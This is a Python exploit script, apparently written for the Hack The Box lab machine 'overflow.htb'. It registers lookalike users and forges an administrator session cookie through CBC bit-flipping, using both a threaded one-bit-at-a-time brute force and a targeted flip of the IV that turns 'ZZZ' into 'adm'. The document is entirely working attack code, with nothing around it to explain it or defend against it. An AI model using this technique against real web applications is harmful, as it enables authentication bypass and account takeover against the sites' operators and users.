import binascii
import requests

from base64 import b64decode as b64d, b64encode as b64e
from Crypto.Util.number import long_to_bytes as l2b
from requests.exceptions import ConnectionError
from threading import Thread
from typing import Tuple


def try_cookie(cookie: str, original_length: int):
    try:
        r = requests.get('http://overflow.htb/home/index.php',
                         headers={'Cookie': f'auth={cookie}'})
        if original_length < len(r.text):
            print(f'[*] Bit-flip cookie for user admin: {cookie}')
    except (ConnectionError, ValueError):
        pass


def do_login(user: str) -> Tuple[str, int]:
    pw = 'asdffdsa'
    r = requests.post('http://overflow.htb/register.php', allow_redirects=False,
                      data={'username': user, 'password': pw, 'password2': pw})

    if r.headers.get('Set-Cookie') is None:
        r = requests.post('http://overflow.htb/login.php', allow_redirects=False,
                          data={'username': user, 'password': pw})

    original_cookie = r.headers.get(
        'Set-Cookie')[len('auth='):].replace('%2F', '/')

    r = requests.get('http://overflow.htb/home/index.php',
                     headers={'Cookie': f'auth={original_cookie}'})
    original_length = len(r.text)

    return original_cookie, original_length


def to_hex(cookie: str):
    return b64d(cookie).hex()


def main_bf():
    original_cookie, original_length = do_login('`dmin')
    print(f'[+] Original cookie for user `dmin: {original_cookie}')

    n = len(to_hex(original_cookie)) * 4 - 1
    threads = []

    for i in range(n, -1, -1):
        try:
            cookie = b64e(l2b(int(to_hex(original_cookie), 16) ^ (1 << i)))
            threads.append(Thread(target=try_cookie,
                                  args=(cookie.decode(), original_length)))
        except UnicodeDecodeError:
            pass

    [t.start() for t in threads]
    [t.join() for t in threads]


def main_special():
    original_cookie, original_length = do_login('ZZZin')
    print(f'[+] Original cookie for user ZZZin: {original_cookie}')

    hex_cookie = to_hex(original_cookie)
    iv = hex_cookie[:16]
    prev_iv = int(iv, 16) ^ int(b'ZZZ'.hex(), 16)
    mod_iv = hex(prev_iv ^ int(b'adm'.hex(), 16))[2:]
    new_hex_cookie = mod_iv + hex_cookie[16:]
    new_hex_cookie = '0' * (len(new_hex_cookie) % 2) + new_hex_cookie
    new_cookie = b64e(binascii.unhexlify(new_hex_cookie)).decode()

    try_cookie(new_cookie, original_length)


if __name__ == '__main__':
    main_bf()
    main_special()
